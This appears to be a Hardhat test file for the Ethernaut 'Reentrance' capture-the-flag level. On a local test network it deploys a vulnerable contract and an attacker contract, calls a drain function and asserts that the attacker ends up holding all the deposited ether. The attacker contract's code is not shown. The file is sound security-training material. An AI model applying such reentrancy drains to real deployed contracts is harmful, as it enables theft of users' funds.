import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { ethers } from "hardhat";
import { toWei } from "scripts/utils";
import { Reentrance, ReentranceAttacker } from "typechain-types";
import { expect } from "chai";

// Challenge description

// The goal of this level is for you to steal all the funds from the contract.

// Things that might help:
// Untrusted contracts can execute code where you least expect it.
// Fallback methods
// Throw/revert bubbling
// Sometimes the best way to attack a contract is with another contract.

describe("Ethernaut - Reentrance", async () => {
  let reentrance: Reentrance;
  let reentranceAttacker: ReentranceAttacker;
  let owner: SignerWithAddress, attacker: SignerWithAddress;

  before(async () => {
    [owner, attacker] = await ethers.getSigners();
    reentrance = await ethers
      .getContractFactory("Reentrance", owner)
      .then((f) => f.deploy());
    reentranceAttacker = await ethers
      .getContractFactory("ReentranceAttacker", attacker)
      .then((f) => f.deploy());
  });

  it("Hacks", async () => {
    await reentrance
      .connect(owner)
      .donate(owner.address, { value: toWei("3") });
    expect(await reentrance.balanceOf(owner.address)).equal(toWei("3"));

    await reentranceAttacker
      .connect(attacker)
      .drain(reentrance.address, { value: toWei("0.4") });

    expect(await ethers.provider.getBalance(reentrance.address)).equal(0);
    expect(await ethers.provider.getBalance(reentranceAttacker.address)).equal(
      toWei("3.4"),
    );
    expect(await reentrance.balanceOf(owner.address)).equal(toWei("3"));
  });
});
